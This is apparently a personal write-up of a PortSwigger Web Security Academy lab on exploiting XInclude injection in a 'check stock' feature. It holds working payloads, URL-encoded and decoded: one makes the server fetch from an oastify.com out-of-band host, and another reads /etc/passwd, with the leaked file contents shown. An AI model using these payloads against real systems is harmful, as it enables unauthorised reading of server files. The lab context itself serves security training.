# [Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

## Lab

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic  [XXE](https://portswigger.net/web-security/xxe)  attack.

To solve the lab, inject an  `XInclude`  statement to retrieve the contents of the  `/etc/passwd`  file.

## Analysis

check stock request:

```x-www-form-urlencoded
productId=1&storeId=1
```

## tools

- burpsuite scanner: detected `Issue:Â Out-of-band resource load (HTTP)`

  - request:

    ```x-www-form-urlencoded
    productId=%3ccdk%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2f2ehqp9rwyejdbdt4wd22d5b7xy3p5dv1wpoce03.oastify.com%2ffoo%22%2f%3e%3c%2fcdk%3e&storeId=1
    ```

  - url-decoded request:

    ```x-www-form-urlencoded
    productId=<cdk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://2ehqp9rwyejdbdt4wd22d5b7xy3p5dv1wpoce03.oastify.com/foo"/></cdk>&storeId=1
    ```

  - => xxe xinclude attack

## Solutions

request's body:

```text
productId=%3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%0d%0a%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e&storeId=1
```

decoded:

```text
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

response:

```text
"Invalid product ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```
